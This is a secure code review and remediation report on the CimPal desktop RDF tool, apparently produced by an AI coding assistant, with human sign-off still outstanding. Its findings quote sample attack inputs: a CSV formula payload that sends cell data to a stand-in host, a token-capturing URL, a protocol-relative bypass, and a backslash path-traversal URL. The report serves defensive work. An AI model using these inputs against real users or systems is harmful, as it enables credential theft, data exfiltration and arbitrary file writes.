# Application Security Self-Attestation Report

> **PROVENANCE — AI-GENERATED ASSESSMENT AND REMEDIATION.**
>
> The secure code review described in this document, and the code changes recorded in §4,
> were produced by **Claude (Anthropic), model Opus 5**, operating as an AI coding assistant
> inside JetBrains IntelliJ IDEA, at the direction of the CimPal maintainer.
>
> This is a **self-attestation**: it records work performed and verified by an automated
> reviewer. It is **not** an independent audit, not a penetration test, and carries no
> third-party assurance. Every finding was manually traced to an exploitable path in source
> before being recorded, and every remediation was verified by a clean full rebuild and a
> passing unit-test suite (§4.6). Nevertheless, an assessor should treat §4 as a statement
> of *what was changed and why*, subject to independent confirmation, rather than as
> certification by a qualified human assessor.
>
> **Human sign-off in §6 is unsigned and remains outstanding.** This document is not valid
> for external release until a named accountable human has reviewed and signed it.

---

## 1. Executive Summary

A structured secure code review of the application identified in §2 has been completed, and
remediations for all identified findings have been implemented and verified. The review
assessed the application's source code against recognised industry cybersecurity baselines
for secure software development, with emphasis on the classes of defect most frequently
exploited in production systems.

The application is a **single-user desktop engineering tool** for Common Information Model
(CIM) data: it parses, compares, transforms, validates and exports RDF/XML, Turtle, SHACL,
ZIP and Office documents. It exposes no network listener, no multi-tenant service, no
database and no authentication or session layer. Its security posture is therefore governed
not by access-control enforcement but by the integrity of its **untrusted-input processing**
and its **outbound network and filesystem behaviour**.

Accordingly, the review scoped the trust boundary as follows:

- **Untrusted inputs:** RDF/CGMES datasets, SHACL shape files, `owl:imports` references,
  ZIP archives, and Excel mapping/configuration workbooks — all of which are routinely
  received from third parties (system operators, vendors, project partners) in this domain.
- **Trusted inputs:** application-bundled resources on the classpath.
- **Assets at risk:** the operator's workstation filesystem, credentials present in the
  process environment, internal network reachability from the workstation, and the integrity
  of reports the application produces for downstream consumers.

The review produced **12 findings and 1 hardening item**: 1 High/Critical, 1 High,
2 Medium-High, 3 Medium, and 5 Low. **All 13 are remediated and verified.**

The most significant finding was a chain of three defects in the remote-shapes subsystem
(`ValidationTools`) that composed into a single high-impact attack: a third-party SHACL
shapes file or mapping workbook could cause the application to disclose the operator's
GitHub credential to an attacker-controlled host, issue arbitrary requests into the internal
network, and write a file outside its cache directory. The remediation introduces a single
mandatory two-tier egress policy through which every outbound request now passes.

Four requested assessment categories were determined to be **not applicable** to this
architecture; the basis for each exclusion is recorded in §3.3 rather than omitted, so that
an assessor can verify the reasoning rather than assume the categories were skipped. Four
further controls were tested and found **already effective**; these are recorded in §3.4 as
positive assurance.

---

## 2. Assessment Scope

| Field | Value |
|---|---|
| Application name | CimPal |
| Component / repository | `github.com/griddigit/CimPal` |
| Version reviewed | 2026.9.05.1 |
| Git revision (base commit) | `b1585473eed70cceea3b0930e82232eed3f7e6a9` (`b158547`) |
| Branch | `devel` |
| Review start date | 2026-09-06 |
| Review completion date | 2026-09-06 |
| Remediation completion date | 2026-09-06 |
| Reviewer | Claude (Anthropic), model Opus 5 — AI coding assistant |
| Review harness | Claude Code, JetBrains IntelliJ IDEA 2026.2 |
| Approver / accountable owner | *outstanding — see §6* |
| Target platform(s) | Windows (primary, packaged via launch4j as `CimPal.exe`); Linux and macOS supported |
| Runtime / toolchain | Java 25, JavaFX 25.0.3, Apache Maven, Apache Jena 6.2.0 |
| Licence | EUPL-1.2-or-later |

### 2.1 Modules in Scope

| Module | Description | In scope |
|---|---|---|
| `CimPal-Core` | RDF/SHACL comparison, conversion, validation engine | Yes |
| `CimPal-Main` | JavaFX desktop application, controllers, task wizard | Yes |
| `CimPal-CustomWriter` | Custom Jena RDF/XML serialisers | Yes |
| `CimPal-CLI` | Command-line manifest service | Yes |

All four Maven modules were included. 31 files were modified across all four modules plus
the aggregator POM; one new test class was added.

### 2.2 Explicitly Out of Scope

The following were **not** assessed by this review and no assurance is offered over them:

- Third-party library internals (assessed only by version currency and configuration —
  see §4, finding 12).
- The build, release and code-signing pipeline, and the integrity of published binaries.
- The host operating system, its patch level, and its filesystem access controls, which
  this application relies upon as its primary access-control boundary (see §3.3).
- Dynamic/runtime testing, fuzzing, and adversarial penetration testing (see §5).
- Any deployed server-side or hosted component, if such a component exists outside the
  reviewed repository.
- The `ExamplesTemplates/` sample workbooks and bundled help content, as data rather than code.

---

## 3. Security Methodology

### 3.1 Frameworks Applied

The review was conducted against the following reference frameworks:

| Framework | Application to this review |
|---|---|
| **OWASP Top 10:2021** | Primary risk taxonomy. Categories A01 (Broken Access Control), A03 (Injection), A05 (Security Misconfiguration), A06 (Vulnerable and Outdated Components), A08 (Software and Data Integrity Failures), A09 (Security Logging and Monitoring Failures) and A10 (Server-Side Request Forgery) were each assessed against the codebase. |
| **CWE / SANS Top 25 Most Dangerous Software Weaknesses** | Per-finding weakness classification. Every finding in §4 carries a specific CWE identifier to support downstream tracking and assessor cross-referencing. |
| **OWASP ASVS** (selected) | Used for control-level expectations on input validation, output encoding, and outbound request handling in a thick-client context. |

### 3.2 Review Technique

The review was **manual, source-level, and control-flow driven**, not a tool-only scan:

1. **Architecture and trust-boundary modelling** — enumeration of every point at which
   externally supplied data enters the application, and every point at which the application
   writes to the filesystem, spawns a process, or initiates an outbound request.
2. **Primitive enumeration** — targeted search for security-relevant API usage: process
   execution, archive extraction, deserialization, XML parser construction, query
   construction, HTTP client construction, template and script evaluation.
3. **Line-by-line analysis** of each identified sink, tracing data provenance backwards to
   an untrusted source to establish whether the path is genuinely attacker-influenced.
4. **Exploitability confirmation** — each candidate finding was assessed for a concrete
   attack path. Candidates that proved safe by construction were **excluded from §4** and
   recorded in §3.4, so that the finding list reflects real risk rather than pattern matches.
5. **Dependency and configuration assessment** — declared dependency versions, transitive
   version conflicts, framework security defaults, and observability configuration.
6. **Secure refactoring** — a specific, framework-idiomatic remediation was authored for
   each finding, preserving existing functional behaviour.
7. **Verification** — clean full rebuild plus unit-test execution, and a source-level
   re-scan confirming each vulnerable pattern is absent (§4.6).

### 3.3 Categories Assessed and Determined Not Applicable

An assessor should expect these categories to be absent from §4. Each was assessed and
excluded on architectural grounds, with the compensating control noted.

| Category | Determination | Basis |
|---|---|---|
| SQL / NoSQL injection | **Not applicable** | The application contains no relational or document database client and constructs no database queries. Persistence is to flat files and an embedded RDF store only. |
| Broken authentication, session management, JWT handling, password hashing | **Not applicable** | The application implements no authentication, no session concept, no token issuance or verification, and stores no user credentials. There is no login surface to weaken. The single use of SHA-256 is a cache key derived from a URL, not a credential digest. |
| Broken object-level / function-level access control (IDOR, missing RBAC) | **Not applicable** | Single-user desktop application with no server-side object model, no request-scoped identity, and no multi-tenancy. Authorization is delegated in full to host operating-system filesystem ACLs, which are declared out of scope in §2.2. |
| Cross-site scripting (XSS) | **Assessed — not vulnerable** | The application's only HTML rendering surface loads a single application-bundled local help document. The one dynamic value written into that document originated from a closed enumeration of three compile-time constants and could not carry attacker input. Nonetheless hardened — see §4.5, H1. |

### 3.4 Controls Verified as Effective

The following were specifically tested for and found to be **adequately controlled** before
remediation began. They are recorded here as positive assurance:

| Control | Finding |
|---|---|
| XML External Entity (XXE) processing — CWE-611 | No XML parser factory is constructed directly by application code (the only occurrence, in `CustomBasic.java`, is commented out). All XML and OOXML parsing is delegated to Apache Jena 6.2.0 and Apache POI 5.5.1, whose defaults disable external entity and DTD resolution. No XXE path identified. |
| Insecure deserialization — CWE-502 | No use of Java native deserialization (`ObjectInputStream`, `readObject`, `XMLDecoder`) anywhere in the codebase. Not exploitable. |
| Spreadsheet cell output encoding, XLSX path — CWE-1236 | Excel export writes untrusted values via `Cell.setCellValue(String)`, which Apache POI emits as an explicit inline string cell rather than a formula cell. Not susceptible. **The CSV export path was not equivalently protected — see finding 4.** |
| Query injection into the RDF query engine | SPARQL query text is operator-authored within the tool rather than assembled from untrusted fragments; the Excel export path additionally enforces `query.isSelectType()`. No use of the SPARQL `SERVICE` clause and no remote query endpoints. No injection path identified. |

---

## 4. Summary of Vulnerabilities Remedied

**Status legend:** `Remediated & Verified` — fix implemented, compiles clean, and the
vulnerable pattern confirmed absent by source re-scan; where a regression test exists it is
named. All statuses below are as at the remediation completion date in §2.

Primary remediation site unless otherwise stated:
`CimPal-Core/src/main/java/eu/griddigit/cimpal/core/utils/ValidationTools.java`.

### 4.1 High and Critical Severity

#### Finding 1 — Credential disclosure to an attacker-controlled host

| | |
|---|---|
| **Severity** | **High / Critical** |
| **CWE** | CWE-522 (Insufficiently Protected Credentials), CWE-201 (Insertion of Sensitive Information Into Sent Data), CWE-668 (Exposure of Resource to Wrong Sphere) |
| **OWASP** | A05, A10 |
| **Location** | `ValidationTools.addGitHubAuthHeader` |
| **Status** | **Remediated & Verified** |

**Discovered condition.** The `GITHUB_TOKEN` environment credential was attached to outbound
requests on the basis of `url.contains("github.com")` — a substring test against the entire
URL rather than a match on the URI authority. Any attacker-controlled address that merely
mentioned the domain in its host, path, query or fragment satisfied the test, for example
`https://evil.example.com/github.com/shapes.ttl`. Because import URLs are supplied by
third-party shape files and mapping workbooks (finding 2), a malicious data file could cause
the operator's credential — typically a personal access token with repository read/write —
to be transmitted to a server of the attacker's choosing. The client was additionally
configured to follow redirects, so a legitimate host could redirect the credential off-site.

**Remediation applied.** The function now takes a parsed `URI` rather than a string and
matches the case-normalised authority against an exact host allowlist (`GITHUB_AUTH_HOSTS`),
deliberately kept separate from the fetch allowlist so that widening one cannot silently
widen the other. A new `newHttpClient(boolean credentialed)` factory sets
`Redirect.NEVER` for any request carrying a credential, preventing header forwarding across
hops. All three call sites were updated.

**Regression tests.** `ShapeSourceTest.classify_httpsHostMerelyMentioningAllowlistedDomain_refused`,
`classify_embeddedCredentials_refusedByEgressPolicy`.

---

#### Finding 2 — Server-Side Request Forgery via `owl:imports` and workbook URL fields

| | |
|---|---|
| **Severity** | **High** |
| **CWE** | CWE-918 (SSRF), CWE-400 (Uncontrolled Resource Consumption) |
| **OWASP** | A10 |
| **Location** | `ValidationTools.resolveImport`, `.fetchHttpBytes`, `.fetchHttpWithDiskCache`, `.fetchGitHubDirectoryContents` |
| **Status** | **Remediated & Verified** |

**Discovered condition.** Two attacker-controlled inputs could nominate arbitrary HTTP/HTTPS
URLs that the application would then fetch: `owl:imports` statements inside any loaded SHACL
`.ttl` shapes file, and URL tokens in mapping-workbook rows (`MappingRow.xmlInputsRaw`). The
only filter applied was whether the URL carried a recognised RDF file extension. There was
no scheme restriction (plaintext `http://` was accepted), no host allowlist, no filtering of
private, loopback or link-local addresses, and no response size limit. This permitted
internal network and port enumeration from the operator's workstation, retrieval of
cloud instance-metadata endpoints, and memory exhaustion from an oversized response — with
the configured retry-and-backoff amplifying each probe.

**Remediation applied.** A single mandatory egress policy gate, split into two tiers so that
correctness does not depend on network availability:

- `requireAllowedRemoteUri(String)` — HTTPS only, exact host allowlist
  (`ALLOWED_REMOTE_HOSTS`), rejection of embedded credentials. Performs no name resolution,
  so it is deterministic and safe to apply when *classifying* an import and when running
  offline against the disk cache.
- `requirePublicHost(URI)` — rejects hosts resolving to loopback, link-local, site-local,
  wildcard or multicast addresses. Applied immediately before a request is issued.
- `requireFetchableRemoteUri(String)` — applies both tiers; used at all three fetch sites.
- `requireBoundedBody(...)` — enforces `MAX_REMOTE_BODY_BYTES` (64 MiB) on every response.

`resolveImport` applies the first tier, so a refused import is reported as unresolvable
rather than attempted. The protocol-relative bypass (`//evil.example/x.ttl`), which is not
caught by the `http://`/`https://` prefix tests and reaches the relative-reference branch
where `URI.resolve` replaces the parent authority, is re-validated after resolution.

**Regression tests.** `ShapeSourceTest.loopbackRemoteImport_isRefusedAndNotFetched`,
`metadataEndpointImport_isRefusedAndNotFetched`,
`classify_plainHttp_refusedByEgressPolicy`,
`classify_httpsNonAllowlistedHost_refusedByEgressPolicy`,
`classify_protocolRelativeFromRemote_refusedByEgressPolicy`.

**Note for operators.** Remote fetching remains enabled by default, now constrained to the
allowlist. Sites wishing to eliminate outbound egress entirely can set
`RemoteFetchConfig.offline` to `true`; this was deliberately *not* changed, as it would
disable a working feature rather than secure it.

---

### 4.2 Medium-High Severity

#### Finding 3 — Unsafe OS command construction

| | |
|---|---|
| **Severity** | **Medium-High** |
| **CWE** | CWE-78 (OS Command Injection), CWE-88 (Argument Injection), CWE-426 (Untrusted Search Path) |
| **OWASP** | A03 |
| **Location** | `CimPal-Main/.../taskWizardControllers/TaskStatusController.openOutputDirectory` |
| **Status** | **Remediated & Verified** |

**Discovered condition.** `Runtime.getRuntime().exec("explorer /open, " + outputDirectory)`
contained three defects. The single-string `exec` overload tokenises its argument on
whitespace, so path segments became separate arguments (argument injection, and a functional
break on any path containing a space — the common case). The executable was named
unqualified, and Windows `CreateProcess` searches the application directory and current
working directory before `System32`, so a planted `explorer.exe` would execute instead.
Finally, the declared `IOException` propagated out of an FXML event handler.

**Remediation applied.** Replaced with `Desktop.getDesktop().open(dir.getCanonicalFile())`,
which passes the path as a single opaque argument and resolves no executable name — matching
the pattern already used correctly in `HelpWindow` and `AboutController`. Added a
null/not-a-directory guard and routed failures through the existing
`GUIhelper.showUserFriendlyError` helper. This also fixes the pre-existing spaces-in-path bug.

---

#### Finding 4 — Spreadsheet formula injection in exported CSV reports

| | |
|---|---|
| **Severity** | **Medium-High** |
| **CWE** | CWE-1236 (Improper Neutralization of Formula Elements in a CSV File) |
| **OWASP** | A03 |
| **Location** | `CimPal-Core/.../diffexport/ComparisonCsvWriter.csvEscape`; `CimPal-Main/.../core/ExportSHACLInformation.csvEscape` |
| **Status** | **Remediated & Verified** |

**Discovered condition.** Both CSV writers implemented correct RFC-4180 quoting but did not
neutralise leading formula-trigger characters. RFC-4180 quoting is orthogonal to formula
injection: Excel and LibreOffice evaluate a cell whose content begins with `=`, `+`, `-`,
`@`, TAB or CR. The values written are RDF literals and IRIs taken from the third-party
models being compared, so an attacker controlled them fully. Because a comparison CSV is
precisely the artifact circulated to colleagues and counterparties, a payload such as
`=HYPERLINK("https://evil.example/?d="&A1,"ok")` would execute on the *recipient's* machine,
making the exporting tool a delivery vehicle.

**Remediation applied.** A `FORMULA_TRIGGERS` constant and a neutralisation step were added
ahead of RFC-4180 quoting in both escape routines, prefixing a single apostrophe to force
literal interpretation without altering the displayed value. Both writers were fixed; no
other CSV emission path exists in the codebase.

**Regression tests.** New test class `ComparisonCsvWriterTest` (9 tests) covering every
trigger character, a realistic exfiltration payload, and confirmation that benign values,
IRIs and existing RFC-4180 quoting behaviour are unchanged.

---

### 4.3 Medium Severity

#### Finding 5 — Path traversal in remote cache filename derivation

| | |
|---|---|
| **Severity** | **Medium** |
| **CWE** | CWE-22 (Path Traversal), CWE-73 (External Control of File Name or Path) |
| **OWASP** | A01 |
| **Location** | `ValidationTools.downloadXmlToCache` |
| **Status** | **Remediated & Verified** |

**Discovered condition.** The cache filename was derived from the URL segment after the last
forward slash. Because the split considered `'/'` only, a backslash — a path separator on
the target platform — survived into `Path.resolve`. A URL ending
`…/a\..\..\..\Users\Public\Startup\evil.xml` therefore escaped the cache directory, yielding
an arbitrary file write with attacker-controlled bytes, reachable from a URL in a
third-party mapping workbook. CimPal ships primarily as a Windows executable, making this
the principal platform.

**Remediation applied.** New `safeCacheFileName(String)` splits on both separators, anchors
identity on the SHA-256 of the URL, and reduces any human-readable suffix to
`[A-Za-z0-9._-]`. Both the target and temporary paths are normalised and asserted to be
contained within `REMOTE_XML_CACHE_DIR` before any write.

---

#### Finding 6 — Insecure use of shared temporary and fixed-path directories

| | |
|---|---|
| **Severity** | **Medium** |
| **CWE** | CWE-377 (Insecure Temporary File), CWE-379 (Creation of Temporary File in Directory with Insecure Permissions) |
| **OWASP** | A08 |
| **Location** | `ValidationTools.initRemoteXmlCacheDir`, `DEBUG_LOG_PATH`, `writeDebugLine` |
| **Status** | **Remediated & Verified** |

**Discovered condition.** The remote-XML cache was created at a predictable path inside the
system-wide temporary directory (`java.io.tmpdir/cimpal_remote_xml_cache`) with default
permissions, and the diagnostic log at a hardcoded `C:\Temp\cimpal_validation_debug.log`. On
POSIX hosts `/tmp` is world-writable, so any local account could pre-create the directory or
replace cached XML entries that the application subsequently parses as trusted validation
input — silent result tampering — or tamper with the audit trail. The existing shapes cache
already did this correctly via `LOCALAPPDATA`, so the codebase was internally inconsistent.

**Remediation applied.** New `userDataDir()` resolves a per-user location
(`%LOCALAPPDATA%\CimPal`, falling back to `~/.cimpal`), and new
`createPrivateDirectory(Path)` creates directories with POSIX mode `rwx------` where the
filesystem supports it. Both the remote-XML cache and the diagnostic log now use them, as
does the shapes disk cache on write.

---

#### Finding 7 — Uncontrolled resource consumption during archive expansion

| | |
|---|---|
| **Severity** | **Medium** |
| **CWE** | CWE-409 (Improper Handling of Highly Compressed Data), CWE-674 (Uncontrolled Recursion), CWE-400 |
| **OWASP** | A05 |
| **Location** | `CimPal-Core/.../utils/ModelFactory.unzip`; `ValidationTools.unzipXmlFiles` |
| **Status** | **Remediated & Verified** |

**Discovered condition.** Archive entries were read fully into memory via `readAllBytes()`
and *retained* in the returned list; nested archives recursed with no depth bound; and no
limit existed on entry count, per-entry size, or cumulative expanded size. A decompression
bomb — plausible as a "CGMES dataset" from a counterparty — exhausted the heap and
terminated the application, and deep nesting could exhaust the stack. The disk-extracting
path (`unzipXmlFiles`) had a correct traversal guard but no size budget, so a bomb there
filled the operator's disk instead. A per-entry `IOException` was additionally swallowed
with `printStackTrace()`, silently yielding an incomplete model.

**Remediation applied.** A `ZipBudget` object is threaded through the entire recursive
traversal, enforcing `MAX_ZIP_ENTRIES` (10 000), `MAX_TOTAL_UNCOMPRESSED_BYTES` (2 GiB) and
`MAX_ZIP_NESTING_DEPTH` (3) across nested archives collectively rather than per archive. The
disk-extracting path gained equivalent `MAX_EXTRACTED_ENTRIES` / `MAX_EXTRACTED_BYTES` caps
with cleanup of the partial file on breach. The swallowed per-entry exception is now
propagated, so an expansion failure is visible rather than producing silently partial data.

---

### 4.4 Low Severity

#### Finding 8 — Weak and misplaced archive-extraction guard

| | |
|---|---|
| **Severity** | **Low** (latent) |
| **CWE** | CWE-22 |
| **OWASP** | A01 |
| **Location** | `isValidDestPath` in `CimPal-Core/.../utils/ModelFactory`, `CimPal-Main/.../util/ModelFactory`, `CimPal-Main/.../core/InstanceDataFactory`, `CimPal-Main/.../datagenerator/InstanceDataFactory` |
| **Status** | **Remediated & Verified** |

**Discovered condition.** Four duplicated copies of the guard compared **unnormalised
strings by prefix** (`destPathNormalized.toString().startsWith(targetDir + File.separator)`)
against a `targetDir` that was neither absolutised nor normalised — which is not a
containment check and is unsound for a relative or non-normalised base. Compounding this,
two call sites guarded code paths that perform **no filesystem write** (entries are read
into in-memory models), creating false assurance that archive handling was hardened while
the actual gap was finding 7.

**Remediation applied.** All four copies now compare normalised absolute `Path` objects and
require strict containment (`dest.startsWith(base) && !dest.equals(base)`). The inert call
site in `ModelFactory.unzip` was removed and the method retained, documented, for future
code that does extract to disk.

---

#### Finding 9 — Log injection and sensitive data in diagnostic logs

| | |
|---|---|
| **Severity** | **Low-Medium** |
| **CWE** | CWE-117 (Improper Output Neutralization for Logs), CWE-532 (Insertion of Sensitive Information into Log File) |
| **OWASP** | A09 |
| **Location** | `ValidationTools.dbg`, `.writeDebugLine`, and ~28 call sites |
| **Status** | **Remediated & Verified** |

**Discovered condition.** Untrusted URLs, import URIs, workbook tokens and RDF values were
written to the diagnostic log unsanitised. A value containing CR/LF forged arbitrary log
records, defeating the log's evidentiary value during precisely the incident review where it
matters. Full URLs including query strings were recorded, risking capture of
credential-bearing parameters such as `?token=…` or signed URLs.

**Remediation applied.** Two helpers were added: `forLog(String)` neutralises CR, LF, NEL,
LS and PS to U+241E and bounds field length to 512 characters; `urlForLog(String)`
additionally redacts the query string. Every one of the 28 `dbg(...)` call sites that
interpolates an untrusted value was updated to use them. Request headers are never logged.

---

#### Finding 10 — Hardcoded internal filesystem paths

| | |
|---|---|
| **Severity** | **Low** |
| **CWE** | CWE-1188 (Insecure Default Initialization), CWE-200 (Exposure of Sensitive Information) |
| **OWASP** | A05 |
| **Location** | `ValidationTools` constants `XML_REPORT_PREFIX`, `CONSTRAINT_REPORT_PREFIX`, `DEBUG_LOG_PATH` |
| **Status** | **Remediated & Verified** |

**Discovered condition.** Developer-workstation absolute paths were compiled into the
shipped binary — `C:\GitHub\relicapgrid\Instance\` and
`C:\SHACL-Constraints\ApplicationLibraryValidationConfigurations\` — disclosing internal
directory layout and an internal project identifier to anyone who decompiles or greps the
JAR, and preventing portable configuration.

**Remediation applied.** Analysis showed `trimReportPath(String, String)` **ignored** its
`prefixToRemove` argument entirely (it returns the last path segment unconditionally), so
both constants were dead code. Both were deleted, the now-redundant parameter was removed
from the method, and all four call sites were updated. `DEBUG_LOG_PATH` was relocated to the
per-user directory under finding 6.

---

#### Finding 11 — Improper error handling and information exposure

| | |
|---|---|
| **Severity** | **Low** |
| **CWE** | CWE-209 (Generation of Error Message Containing Sensitive Information), CWE-390 (Detection of Error Condition Without Action), CWE-772 (Missing Release of Resource) |
| **OWASP** | A09 |
| **Location** | 58 live call sites across 22 files; `TaskDependenciesEnforcer` constructor |
| **Status** | **Remediated & Verified** |

**Discovered condition.** 62 occurrences of `printStackTrace()` at the base revision (58
live, 4 already commented out) wrote exception detail, including absolute filesystem paths,
to `stderr` — which under the windowed launcher is discarded entirely, so diagnostic detail
was lost exactly when needed. `TaskDependenciesEnforcer` additionally contained three
defects in ten lines: an `InputStream` that was never closed, an `IOException` swallowed
with `printStackTrace()` leaving `taskOrderConstraints` null, and a consequent
`NullPointerException` raised far from the real cause on the next call.

**Remediation applied.** All 58 live call sites were addressed. Two were resolved as part of
other findings: the swallowed per-entry archive exception under finding 7, and the
`TaskDependenciesEnforcer` constructor below. The remaining 56 were converted to logger
calls — the 7 in `ValidationTools` route through a new `logError(String, Throwable)` overload
that records the sanitised message and stack trace to the existing diagnostic log,
consistent with that file's own idiom; the 49 in `CimPal-Main` route through per-class SLF4J
loggers
(`LoggerFactory.getLogger(X.class)`). Control flow is unchanged in every case — only the
destination of the diagnostic output. `TaskDependenciesEnforcer` now fails fast with a
descriptive `IOException` on a missing resource, closes the stream via try-with-resources,
assigns its fields finally, and uses `getOrDefault(taskName, List.of())` so an unknown task
name is unconstrained rather than a crash.

---

#### Finding 12 — Dependency and observability configuration

| | |
|---|---|
| **Severity** | **Low** |
| **CWE** | CWE-1104 (Use of Unmaintained Third Party Components), CWE-1035 (Externally-Controlled Vulnerable Component), CWE-778 (Insufficient Logging) |
| **OWASP** | A06, A09 |
| **Location** | `pom.xml` (aggregator), `CimPal-Core/pom.xml`, `CimPal-Main/pom.xml`, `CimPal-CustomWriter/pom.xml`, `CimPal-Main/.../module-info.java` |
| **Status** | **Remediated & Verified** |

**Discovered condition.** Four issues. `jena-csv:3.9.0` — released 2018 and end-of-life —
was declared in three modules alongside Jena 6.2.0, kept alive only by six manual
`<exclusions>`. `commons-math4-core:4.0-beta1` was a pre-release pin in a shipped product.
`slf4j-nop` discarded **all** library logging, suppressing the RDF parser, HTTP client and
TLS warnings that are the only field signal that a malformed or hostile input document was
processed — directly undermining findings 2 and 7. No automated dependency vulnerability
scanning or SBOM generation existed in the build.

**Remediation applied.**
- `jena-csv:3.9.0` removed from all three modules after confirming zero source references
  (no `Lang.CSV`, no `jena.csv` import anywhere), along with its exclusion blocks.
- `commons-math4-core:4.0-beta1` — confirmed unused — replaced with an explicit
  `commons-math3:3.6.1` declaration, which is what the code actually imports
  (`ComparisonInstanceData`) and was previously relied upon only transitively via POI.
- `slf4j-nop` replaced with `slf4j-simple:2.0.18`, with `module-info.java` updated from
  `requires org.slf4j.nop` to `requires org.slf4j.simple`.
- `cyclonedx-maven-plugin:2.9.1` bound to `package` in the aggregator POM, emitting a
  CycloneDX SBOM for every build.
- `dependency-check-maven:12.1.0` added under an opt-in `security-scan` profile with
  `failBuildOnCVSS=7`, invoked as `mvn -Psecurity-scan verify`. Placed in a profile
  deliberately: the plugin downloads and updates a vulnerability database, which is too slow
  for routine incremental builds, and it is intended for CI and pre-release gates.
- `requires java.xml` added to `CimPal-Main` for the DOM API used by H1.

---

### 4.5 Hardening Items

#### H1 — Script source assembled by string concatenation

| | |
|---|---|
| **Severity** | Hardening (no exploitable condition) |
| **Location** | `CimPal-Main/.../gui/HelpWindow.applyTheme` |
| **Status** | **Remediated & Verified** |

**Discovered condition.** The theme value was interpolated into JavaScript source passed to
`WebEngine.executeScript`. Not exploitable: the value derives from a closed `switch` over
three compile-time string constants and cannot carry attacker input. Recorded because the
pattern becomes injectable the moment that value's provenance widens.

**Remediation applied.** Replaced with a direct DOM call —
`engine.getDocument().getDocumentElement().setAttribute("data-theme", key)` — which cannot
be reinterpreted as script regardless of the value.

---

### 4.6 Verification Record

| Check | Method | Result |
|---|---|---|
| Compilation | Full clean rebuild of all four modules, Java 25 | **Pass** — zero errors; only pre-existing deprecation warnings unrelated to these changes (`RandomStringUtils.randomAlphabetic`, `TableView.CONSTRAINED_RESIZE_POLICY`, `SourceStringReader.generateImage`, `new URL(String)`) |
| Static inspection | IntelliJ IDEA inspections at error severity over all modified files | **Pass** — zero problems |
| Unit tests | `ShapeSourceTest` (19) + `ComparisonCsvWriterTest` (9), JUnit 5.13.1 | **Pass** — 28/28 |
| Pattern absence | Source re-scan for each vulnerable construct | **Pass** — `Runtime.getRuntime().exec` absent; substring host test absent; unguarded `HttpClient.newBuilder`/`URI.create(url)` at fetch sites absent; hardcoded `C:\` paths absent; live `printStackTrace()` absent |
| Behavioural regression | Existing local-import, diamond, cycle and triple-count tests in `ShapeSourceTest` | **Pass** — unchanged |

**Test-infrastructure defect found and fixed during verification.** The project's only test
suite could not execute at all: run on the module path, JUnit cannot reflect into
`eu.griddigit.cimpal.core.utils` without the production module opening that package,
failing with `InaccessibleObjectException`. This predates the review (the suite was added in
commit `a24bd5e`). `<useModulePath>false</useModulePath>` was added to the `CimPal-Core`
surefire configuration, which runs tests on the classpath and keeps the production module
descriptor free of test-only `opens` directives.

**Intentional behavioural changes.** Finding 2 changes `resolveImport` semantics by design:
a remote import that egress policy refuses is now reported as an unresolvable import rather
than fetched. Two pre-existing tests encoded the old permissive behaviour
(`classify_http_ttl_returnsRemote` asserted that a plain-HTTP import to an arbitrary host was
fetchable; `failingRemoteImport_throwsIOException` asserted that a loopback import was
attempted and threw) and were rewritten to assert the new, intended security property.

**Limitation on dependency verification.** `mvn` could not resolve artifacts from Maven
Central in the review environment due to TLS interception, so the dependency changes in
finding 12 were verified against the local artifact repository (all replacements confirmed
present and the project compiles and tests green against them) rather than by a clean
network build. `dependency-check-maven` itself is not cached locally and its first execution
will require network access. **A clean `mvn -Psecurity-scan verify` on a network-enabled CI
runner remains outstanding** and is item 1 of §5.3.

---

## 5. Residual Risk Statement

### 5.1 Statement of Position

All 12 findings and 1 hardening item identified by this review — including both High and
Critical-severity findings — have been remediated, and each remediation has been verified by
the means recorded in §4.6. As at the remediation completion date in §2, no known
unmitigated defect of High or Critical severity remained in the reviewed revision.

This statement is made on the basis of an **AI-performed self-assessment** and is
constrained accordingly. It is not equivalent to, and does not substitute for, independent
review by a qualified human assessor or a third-party penetration test.

### 5.2 Acknowledged Residual Risk

The following residual risk is acknowledged and is **not** eliminated by this review:

1. **The reviewer was an AI system.** The findings were derived by automated source analysis
   with manual exploitability tracing, but without human security-engineering judgement
   applied to the result. Both false negatives (missed defects) and mischaracterised
   severities are possible. Independent human review of §4 is recommended before this
   document is relied upon externally.
2. **Manual review is not exhaustive.** A source-level review establishes the absence of
   identified defect classes at the reviewed revision. It cannot establish the absence of
   all defects, and confers no assurance over revisions subsequent to the commit in §2.
3. **No dynamic testing was performed.** Defects that manifest only at runtime — race
   conditions, memory-safety behaviour in native library code, and parser defects reachable
   only through malformed input — would not necessarily be detected by this methodology.
   §5.3 item 4 addresses this gap.
4. **The GUI was not exercised.** Verification was by compilation, static inspection and
   unit test. The modified interactive paths — the "Open output directory" button
   (finding 3) and the Help window theme application (H1) — were not manually exercised in a
   running application. Both are small and behaviour-preserving, but a functional smoke test
   is advisable.
5. **Third-party library internals were not audited.** Assurance over dependencies is
   limited to version currency and configuration. A vulnerability disclosed in a dependency
   after the review date is not covered by this attestation. See also the verification
   limitation at the end of §4.6.
6. **Host-level controls are relied upon and not assured.** As recorded in §3.3, this
   application delegates access control entirely to the host operating system. Its security
   posture is contingent on the workstation being appropriately patched, access-controlled,
   and free of local compromise — none of which this review assessed.
7. **The application processes third-party data by design.** The remediations reduce the
   blast radius of a malicious input document; they do not eliminate the inherent risk of
   parsing complex, externally authored formats. This risk is intrinsic to the tool's
   purpose and is managed rather than removed.
8. **The remote-fetch allowlist is a policy decision requiring maintenance.**
   `ALLOWED_REMOTE_HOSTS` currently permits the GitHub content hosts. Any future addition
   widens the SSRF surface and should be treated as a security-relevant change (§5.3 item 5).

### 5.3 Ongoing Security Programme

The following controls are recommended as continuing obligations. Items 1–3 are implemented
in the build as of this revision; the remainder require an owner and a cadence before this
document is issued externally.

| # | Control | Owner | Cadence | Status |
|---|---|---|---|---|
| 1 | **Automated dependency vulnerability scanning** — `mvn -Psecurity-scan verify`, failing the build on advisories with CVSS ≥ 7.0 in declared or transitive dependencies. | `________` | Every CI build and pre-release | **Configured** — first execution on a network-enabled runner outstanding |
| 2 | **SBOM generation** — CycloneDX BOM emitted at `package` for every build; publish as a release artifact. | `________` | Every release | **Configured** — publication step to be wired into `release.yml` |
| 3 | **Library logging enabled** — real SLF4J binding so parser, HTTP and TLS warnings reach the operator. | `________` | Continuous | **Implemented** |
| 4 | **Independent third-party penetration test**, scoped to malicious-input handling and outbound network behaviour, to address the dynamic-testing gap in §5.2(3). | `________` | Annual, and before major release | Not scheduled |
